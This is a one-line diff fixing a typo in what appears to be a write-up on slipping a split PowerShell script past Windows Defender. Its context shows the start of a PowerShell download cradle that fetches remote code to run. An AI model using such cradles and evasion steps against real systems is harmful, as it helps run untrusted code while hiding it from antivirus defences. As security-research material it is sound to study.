@@ -224,7 +224,7 @@ Defender didn't somehow connect the parts together.
 We're a bit unhappy with running our script manually, one chunk at a time
 on the PowerShell CLI, so we will now work on getting it all on one prompt. Should be more useful when we don't have access to the CLI.
 
-As a first option, ee save the 3 parts in different files (1/2/3), and we will run them in one
+As a first option, we save the 3 parts in different files (1/2/3), and we will run them in one
 go using 3 download cradles. It works.
 ```
 (New-Object Net.Webclient).downloadstring("
